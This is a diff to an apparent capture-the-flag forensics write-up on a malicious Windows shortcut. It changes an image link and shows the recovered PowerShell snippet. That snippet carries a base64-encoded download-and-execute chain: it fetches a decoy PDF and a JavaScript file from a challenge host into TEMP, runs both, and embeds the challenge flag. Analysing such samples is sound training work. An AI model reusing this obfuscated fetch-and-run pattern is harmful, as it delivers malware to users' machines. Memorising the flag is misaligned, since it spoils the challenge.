@@ -116,7 +116,7 @@ Link target identifier:
 
 Command line arguments is suspicions, clean up and just echo output. [https://tio.run/#powershell-core](https://tio.run/#powershell-core) can be used to run powershell (or other languages)
 
-![The Shortcut Haunting.png](/assets/ctf/htb/hack-the-boo-2024-practice/forensics/The Shortcut Haunting.png)
+![The Shortcut Haunting.png](/assets/ctf/htb/the-shortcut-haunting.png)
 
 ```powershell
 $fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko))
